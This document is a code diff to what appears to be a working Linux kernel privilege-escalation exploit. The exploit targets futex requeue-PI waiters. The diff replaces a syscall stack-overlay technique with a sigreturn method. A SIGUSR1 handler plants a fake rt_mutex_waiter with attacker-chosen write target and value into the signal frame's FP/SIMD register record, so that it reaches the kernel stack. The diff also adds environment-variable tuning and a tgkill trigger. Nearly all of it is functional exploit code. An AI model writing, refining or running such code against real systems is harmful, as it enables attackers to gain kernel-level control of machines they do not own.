@@ -1,0 +1,182 @@
+--- /tmp/p50_build/src/slide.c	2026-11-21 21:36:28
++++ /tmp/gl_sig/src/slide.c	2026-11-21 23:17:03
+@@ -256,6 +256,9 @@
+ static int f_cur; /* index of the walk in progress */
+ static atomic_int waiter_ready, waiter_waiting, owner_started, carrier_done;
+ static atomic_int carrier_failed;
++static volatile sig_atomic_t carrier_armed, carrier_stamped;
++static int g_sig_off = 0x118;
++static volatile unsigned g_sig_magic, g_sig_vregs, g_sig_off_found, g_sig_sve;
+ static atomic_int waiter_tid;
+ static atomic_int trigger_started, trigger_finished;
+ /* 80GT-style fire window: the waiter spins in userspace with the plant
+@@ -325,6 +328,46 @@
+  *   +0x30 task                   = &init_task
+  *   +0x38 lock                   = cur_lock (fresh .bss padding slot)
+  *   +0x40 major_prio/major_only, +0x48 prio, +0x50 deadline = 0           */
++
++static void gl_sigreturn_handler(int sig, siginfo_t *info, void *ucv) {
++  (void)sig; (void)info;
++  ucontext_t *uc = (ucontext_t *)ucv;
++  unsigned char *res = (unsigned char *)&uc->uc_mcontext.__reserved;
++  size_t n = sizeof(uc->uc_mcontext.__reserved);
++  size_t off = 0, vregs = 0;
++  int sve = 0;
++  while (off + 8 <= n) {
++    uint32_t magic = 0, size = 0;
++    memcpy(&magic, res + off, 4);
++    memcpy(&size, res + off + 4, 4);
++    if (!magic) break;
++    if (size < 8 || size > n - off) break;
++    if (magic == 0x46508001u) {
++      if (size < 0x210) break;
++      vregs = off + 0x10;
++    } else if (magic == 0x53564501u) {
++      sve = 1;
++    }
++    off += size;
++  }
++  g_sig_magic = 0x46508001u; g_sig_vregs = (unsigned)vregs; g_sig_off_found = (unsigned)g_sig_off; g_sig_sve = (unsigned)sve;
++  if (!vregs || vregs + 0x118 + 0x58 > n) return;
++  uint64_t w[11];
++  memset(w, 0, sizeof(w));
++  if (cur_shape == SHAPE_LEAF) {
++    w[0] = write_target - 8;
++  } else {
++    w[0] = write_value;
++    w[2] = write_target;
++  }
++  w[6] = waiter_task ? waiter_task : canon_addr(SLIDE_INIT_TASK_IMAGE);
++  w[7] = cur_lock;
++  if (g_sig_off < 0 || (size_t)g_sig_off + sizeof(w) > 0x200) return;
++  memcpy(res + vregs + g_sig_off, w, sizeof(w));
++  (void)sve;
++  carrier_stamped = 1;
++}
++
+ static void build_mcast_payload(int shape) {
+   memset(mcast_buf, 0, sizeof(mcast_buf));
+   mcast_buf[1] = 2; /* gsr_group.ss_family = AF_INET (must be AF_INET) */
+@@ -441,43 +484,31 @@
+     raise_rt(g_opts.rt_prio);
+   }
+ 
+-  /* TIF mitigation + carrier with NO syscall in between (see header). */
+-  touch_fpu();
+-  (void)syscall(SYS_sched_yield);
+-  touch_fpu();
+-
+-  /* A52 two-syscall stack overlay.
+-   *
+-   * futex_wait_requeue_pi leaves its rt_mutex_waiter at T-0x198.  A 64-bit
+-   * select(320) copies fd_sets to core_sys_select's stack_fds at T-0x1f0;
+-   * the waiter's tree fields are at stack_fds+0x58 and fit in the 0x78-byte
+-   * stack copy.  process_vm_rw then copies an 8-entry iovec array to
+-   * T-0x190, covering waiter+0x8 through task/lock/prio.  Both syscalls
+-   * return errors for the fake entries, but the copies have already happened.
+-   */
+-  {
+-    uint64_t fake[10];
+-    memset(fake, 0, sizeof(fake));
+-    if (cur_shape == SHAPE_LEAF) {
+-      fake[0] = write_target - 8;
+-    } else {
+-      fake[0] = write_value;
+-      fake[2] = write_target;
++  /* sigreturn carrier: install a SIGUSR1 handler, then let the main child
++   * stamp the delivered fpsimd record into this thread's kernel stack. */
++  {
++    struct sigaction sa;
++    memset(&sa, 0, sizeof(sa));
++    sa.sa_sigaction = gl_sigreturn_handler;
++    sa.sa_flags = SA_SIGINFO | SA_RESTART;
++    sigemptyset(&sa.sa_mask);
++    if (sigaction(SIGUSR1, &sa, NULL) != 0) {
++      pr_warning("slide sigaction errno=%d\n", errno);
++      atomic_store(&carrier_failed, 1);
++      atomic_store(&carrier_done, 1);
++      return NULL;
+     }
+-    fake[6] = waiter_task ? waiter_task : canon_addr(SLIDE_INIT_TASK_IMAGE);
+-    fake[7] = cur_lock;
+-
+-    unsigned char iovbuf[128];
+-    memset(iovbuf, 0, sizeof(iovbuf));
+-    memcpy(iovbuf, ((unsigned char *)fake) + 8, 9 * 8);
+-    unsigned char dummy[64];
+-    memset(dummy, 0, sizeof(dummy));
+-    struct iovec remote = { .iov_base = dummy, .iov_len = 1 };
+-    errno = 0;
+-    long pr = syscall(SYS_process_vm_readv, getpid(),
+-                      (const struct iovec *)iovbuf, 8, &remote, 1, 0);
+-    dbg[7] = (uint64_t)pr;
+-    atomic_store(&carrier_done, 1);
++    sigset_t one;
++    sigemptyset(&one);
++    sigaddset(&one, SIGUSR1);
++    pthread_sigmask(SIG_UNBLOCK, &one, NULL);
++    carrier_stamped = 0;
++    carrier_armed = 1;
++    while (!carrier_stamped) {
++      __asm__ __volatile__("yield" ::: "memory");
++    }
++    carrier_done = 1;
++    waiter_in_gap = 1;
+   }
+ 
+   if (g_opts.noconsume) return NULL;
+@@ -842,6 +873,7 @@
+ }
+ 
+ static int slide_child_test(void) {
++  { const char *e = getenv("SIGSTAMP_OFF"); if (e && *e) { long v = strtol(e, NULL, 0); if (v >= 0 && v <= 0x1a8) g_sig_off = (int)v; } }
+   /* Inline mode runs several walks in one process: every flag must start from
+      zero, otherwise the previous walk's carrier_done/ready flags make this
+      walk trigger before the new ghost has even built its fake lock. */
+@@ -894,6 +926,17 @@
+     struct timespec t0, tn;
+     unsigned long spins = 0;
+     clock_gettime(CLOCK_MONOTONIC, &t0);
++    while (!carrier_armed) {
++      if ((++spins & 0x3fff) == 0) {
++        clock_gettime(CLOCK_MONOTONIC, &tn);
++        if ((long)(tn.tv_sec - t0.tv_sec) * 1000000000L +
++            (long)(tn.tv_nsec - t0.tv_nsec) > 10000000000L) break;
++      }
++      __asm__ __volatile__("yield" ::: "memory");
++    }
++    int stid = atomic_load(&waiter_tid);
++    long tk = syscall(SYS_tgkill, getpid(), stid, SIGUSR1);
++    pr_info("slide sigreturn tgkill tid=%d ret=%ld errno=%d armed=%d\n", stid, tk, errno, (int)carrier_armed);
+     for (;;) {
+       if (atomic_load(&carrier_done)) break;
+       if ((++spins & 0x3fff) == 0) {
+@@ -909,7 +952,10 @@
+                atomic_load(&carrier_failed), atomic_load(&carrier_done));
+     return 0;
+   }
+-  pr_info("slide child carrier_done=%d\n", (int)atomic_load(&carrier_done));
++  pr_info("slide child carrier_done=%d sig magic=%x vregs=%u off=%u sve=%u cur_lock=%016llx task=%016llx\n",
++          (int)atomic_load(&carrier_done), g_sig_magic, g_sig_vregs,
++          g_sig_off_found, g_sig_sve,
++          (unsigned long long)cur_lock, (unsigned long long)waiter_task);
+ 
+   if (!g_opts.noconsume) {
+     int tid = atomic_load(&waiter_tid);
+@@ -1293,6 +1339,16 @@
+     .check_hi = 1,
+     .exp_hi = canon_addr(SLIDE_LOGGERS_0_1_IMAGE),
+   };
++  { const char *e = getenv("GL_SHAPE"); if (e && !strcmp(e, "leaf")) {
++      t.shape = SHAPE_LEAF; t.value = 0;
++      t.target = canon_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE);
++      t.check_lo = 1; t.check_hi = 0; t.exp_lo = 0; t.exp_hi = 0;
++    } }
++  { const char *e = getenv("GL_SAFE"); if (e && *e) {
++      t.shape = SHAPE_LEAF; t.value = 0;
++      t.target = canon_addr(GOT_FAKE_LOCK_BSS_IMAGE) + 0x180;
++      t.check_lo = 0; t.check_hi = 0; t.exp_lo = 0; t.exp_hi = 0;
++    } }
+   return run_spec(&t);
+ }
+ 
